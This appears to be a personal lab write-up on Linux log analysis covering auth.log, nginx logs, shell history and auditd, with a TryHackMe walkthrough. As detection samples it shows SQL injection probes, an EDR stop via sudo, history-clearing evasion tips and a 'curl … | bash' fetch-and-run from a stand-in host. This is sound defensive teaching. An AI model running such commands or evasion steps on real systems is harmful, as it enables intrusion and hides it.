Today, we are going through Linux logs.

Most Linux logs are stored in the **/var/log** folder. Lets start by checking **/var/log/syslog**.

![syslogHEAD 1.png](syslogHEAD 1.png)

Using the command *cat /var/log/syslog | head* we get the first 10 logs of the system logs.

Another way to search for useful and wanted logs is done by using *grep* command.

![grep.png](grep.png)

## Searching for user logins
User logins are store in plain text in the **/var/log/** folder. We can filter by using listing and using grep for narrowing down results and finding what we want using keywords like **login**, **auth**, or **session**.
![ls logs.png](ls logs.png)
![grepz 1.png](grepz 1.png)

# Authentication logs
The most important files to monitor is */var/log/auth.log* or /*var*/log/secure on RHEL systems. This file contains authentication events as well as user management events and launched sudo commands. 

**Login & Logout Events**

![seshlog.png](seshlog.png)

**SSHD Activity**

![sshd.png](sshd.png)

# Miscellaneous Events
We can monitor for user management events such as password changes, user deletion, privileged user creation and so on.

![usermanagement.png](usermanagement.png)

In the logs below, the user **ubuntu** used **sudo** and stopped EDR, read the firewall state, and accessed root using **su**.

```bash
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'COMMAND='
2025-08-07T11:21:49 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/systemctl stop edr
2025-08-07T11:23:18 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/ufw status numbered
2025-08-07T11:23:33 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/su
```

# Generic System Logs
As mentioned previously, most logs are stored in **/var/log**. Lets see whats inside and briefly explain some log files.

![lsvarlog.png](lsvarlog.png)

**/var/log/kern.log**: Kernel messages and errors
**/var/log/syslog**: A wide variety of events
**/var/log/dpkg.log**: Package manager on Debian-based systems
**/var/log/dnf.log**: Package manager logs on RHEL-based systems
The logs mentioned are often noisy and has alot of logs. They are mostly useful for Digital Forensics and Incident Response (DFIR) investigations.

# App logs
This is for monitoring specific apps.

**Web Monitoring**

``` nginx
cat /var/log/nginx/access.log
# Each line corresponds to a web request to the web server
ubuntu@thm-vm:~$ sudo tail -f /var/log/nginx/access.log

192.168.1.50 - - [12/Aug/2025:16:22:11 +0000] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0"

192.168.1.50 - - [12/Aug/2025:16:22:12 +0000] "GET /style.css HTTP/1.1" 200 4312 "https://example.com/" "Mozilla/5.0"

192.168.1.50 - - [12/Aug/2025:16:22:12 +0000] "GET /app.js HTTP/1.1" 200 8120 "https://example.com/" "Mozilla/5.0"

203.0.113.10 - - [12/Aug/2025:16:24:01 +0000] "GET /admin HTTP/1.1" 404 162 "-" "curl/7.68.0"

203.0.113.10 - - [12/Aug/2025:16:24:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "curl/7.68.0"

10.0.0.15 - - [12/Aug/2025:16:25:44 +0000] "POST /login HTTP/1.1" 302 154 "https://example.com/login" "Mozilla/5.0"

10.0.0.15 - - [12/Aug/2025:16:25:45 +0000] "GET /dashboard HTTP/1.1" 200 5321 "https://example.com/login" "Mozilla/5.0"

198.51.100.23 - - [12/Aug/2025:16:27:18 +0000] "GET /images/logo.png HTTP/1.1" 200 4211 "https://example.com/" "Mozilla/5.0"

185.220.101.4 - - [12/Aug/2025:16:35:19 +0000] "GET /index.php?id=1%20OR%201=1 HTTP/1.1" 500 532 "-" "sqlmap/1.7"

185.220.101.4 - - [12/Aug/2025:16:35:20 +0000] "GET /index.php?id=2%20UNION%20SELECT%20NULL HTTP/1.1" 500 544 "-" "sqlmap/1.7"

172.16.0.8 - - [12/Aug/2025:16:38:52 +0000] "GET /api/users HTTP/1.1" 200 892 "https://example.com/app" "python-requests/2.31.0"

172.16.0.8 - - [12/Aug/2025:16:38:53 +0000] "POST /api/upload HTTP/1.1" 201 64 "https://example.com/app" "python-requests/2.31.0"
```

In the log above we can see some scanning activity, errors, user logins, redirections, user requests, and an SQL injection attack. 

**History Command**

The history command shows you each command depending on the user the command is executed at. 

![history.png](history.png)

Although this seems like a great source for analyzing commands executed by an attacker on a compromised machine, it is not so.
- Attackers can simply clear the history logs using *history -c*
- They can add thousands nonsense commands after executing their commands
- Commands can be executed using a script using *.sh*
- Attackers can use shells like sh that doesnt history like Bash

# System Calls

So far we covered monitoring multiple log sources. The issue they all have is a lack of details. For example, how do we know which programs the intruder launched when they gained initial access? What folders were deleted and when? Linux does not monitor process creation, file changes, or events related to the network. These are known as **runtime** events. Windows share the same limitation which is why i covered monitoring using [**Sysmon**](https://github.com/12oLL/Labz/blob/main/LogAnalysis/Sysmon%20via%20PowerShell%20%26%20Event%20Viewer.md).

System calls are basically work like this, when you create a process or open an app, you make a specific **system call**. In Linux, there are more than [300 system calls](https://man7.org/linux/man-pages/man2/syscalls.2.html).  

![Syscalls.png](Syscalls.png)

- **File System**: Used to create, open, read, write, and manage files and directories.
- **Process Control**: Used to create, execute, synchronize, and terminate processes.
- **Memory Management**: Used to allocate, deallocate, and manage memory for processes.
- **Interprocess Communication (IPC)**: Used for data exchange and communication between different processes.
-  **Device Management**: Used to request and release devices, and to perform read/write operations on them.

System calls are important to at least have a grasp general idea about because it is nearly impossible for attackers to bypass them. That being said, lets go over how to monitor utilizing system calls.

# Audit Daemon

Auditid is a built-in audit solution that can be used for runtime monitoring. The rules can be found in */etc/audit/rules.d* which define which system calls to monitor and what filters to apply. Doing this reduces the noise and the massive size of logs being saved on the system, which in case of an attack, makes it difficult to find in the huge amount of logs.

![audit.png](audit.png)

**-a always,exit**: Always log what follows
**-S execve**: Monitor this system call
**-F exe=/usr/bin/wget**: Apply these monitoring filters
**-F key=proc_wget**: Apply these tags for easier search
For more information about **[syscalls](https://man7.org/linux/man-pages/man2/syscalls.2.html)**

## Using Auditd
We discussed the rules and how system calls work. Lets use Auditd to view the logs generated in real time.

![auditd.png](auditd.png)

Using the command *ausearch -i -k proc_wget*, we get two logs. Lets break them down

``` bash
type=PROCTITLE msg=audit(08/12/25 21:39:16.428:1741) : proctitle=wget --timeout 60 -U wget/1.21.4-1ubuntu4.1 Ubuntu/24.04.1/LTS GNU/Linux/6.14.0-1010-aws/x86_64 AMD/EPYC/7571 cloud_id/aws -O- - 

type=CWD msg=audit(08/12/25 21:39:16.428:1741) : cwd=/ 

type=EXECVE msg=audit(08/12/25 21:39:16.428:1741) : argc=8 a0=wget a1=--timeout a2=60 a3=-U a4=wget/1.21.4-1ubuntu4.1 Ubuntu/24.04.1/LTS GNU/Linux/6.14.0-1010-aws/x86_64 AMD/EPYC/7571 cloud_id/aws a5=-O- a6=--content-on-error 
a7=https://motd.ubuntu.com 

type=SYSCALL msg=audit(08/12/25 21:39:16.428:1741) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5ef5c4f1b560 a1=0x5ef5c4f1b318 a2=0x5ef5c4f1b4f8 a3=0x8 
items=2

ppid=1661 pid=1685 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=wget exe=/usr/bin/wget subj=unconfined key=proc_wget 
```

Lets go line by line
**1**: PROCTITLE or process title shows the process command line. It includes the **timestamp**, and an HTTP request to. 
**2:** CWD -> Current working directory. This shows that the command was started from the root directory **/**.
**3:** *EXECVE* system call received 8 arguments *argc=8* . Lets go through all arguments:

**a0=wget**: Program name 
**a1=--timeout**: Option
**a2=60**: Timeout value (a max 60 seconds wait)
**a3=-U**: User-agent option
**a4=wget/1.12.4-lubuntu4.1 ...**: Custom user-agent string
**a5=-O-**: Output to stdout
**a6=--content-on-error**: Forcing output even if HTTP error occurs
**a7=https://motd[.]ubuntu[.]com:** The target URL

**4:** System call *execve* executed successfully,*exit=0* means no error.

**5:** Process *identity* . Parent process id:*ppid=1661* and wget process id:*ppid=1685*.
User identity: auid=unset, the real user: *uid=root* , gid=root , effective privileges: *euid=root*. This was a privileged execution. 
And at last **key=proc_wget** is the audit rule that helped us log this event.

# Lab Test
Ok now we went over the theory, lets get our hands dirty. Im doing a TryHackMe lab.

1. When was the **secret.thm** file opened for the first time? (MM/DD/YY HH:MM:SS)

For this question, i used the command *ausearch -i -k file_thm secret | grep -E secret.thm* 

![Q1.png](Q1.png)

2.  What is the original file name downloaded from GitHub via wget?

This was one pretty easy just *ausearch -i -k proc_wget | grep -E github*

![Q2.png](Q2.png)

3. Which network range was scanned using the downloaded tool? 

This one took me some time . I was very lost at first, navigating through the audit.log raw.

![Lost.png](Lost.png)

I saw a long hex that caught my attention, so i went over to CyberChef

![HEX.png](HEX.png)

It was just to throw me off of the actual result. So i kept looking for the commands executed and it hit me that i should filter for **EXECVE** to get a better look and well  by filtering *cat /var/log/audit/audit.log | grep -E "EXECVE"*


![Q3.png](Q3.png)


We got it

![WhatsApp Image 2026-05-08 at 17.21.53(1).jpeg](WhatsApp Image 2026-05-08 at 17.21.53(1).jpeg)

# Test Yourself

Now that we are done with this, let me give you an exercise to practice what we have learned.

```bash
type=PROCTITLE msg=audit(03/15/26 14:22:09.112:5521) : proctitle=curl -fsSL https://updates.example.com/check.sh | bash -
type=CWD msg=audit(03/15/26 14:22:09.112:5521) : cwd=/home/admin
type=EXECVE msg=audit(03/15/26 14:22:09.112:5521) : argc=6 a0=curl a1=-fsSL a2=https://updates.example.com/check.sh a3= | a4=bash a5=-
type=SYSCALL msg=audit(03/15/26 14:22:09.112:5521) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55c3b7c91a20 a1=0x55c3b7c918f0 a2=0x55c3b7c919d0 a3=0x7 items=2 ppid=1203 pid=1250 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts0 ses=2 comm=bash exe=/usr/bin/bash subj=unconfined key=proc_update
```
1. What command was actually executed?

2. What is the system trying to do?

3. Is this interactive or non-interactive execution?

4. What user is running it (root or normal user)?

5. What stands out as potentially risky or suspicious?

6. What does the pipe (`| bash -`) imply?

# Conclusion

Although auditd is helpful, the results are complex and hard to read, especially when action is needed to be taken. However, there are other tools that might help you better.
- [Sysmon for Linux](https://github.com/microsoft/SysmonForLinux)
- [Falco](https://falco.org/)
- [Osquery](https://osquery.io/)
- EDRs

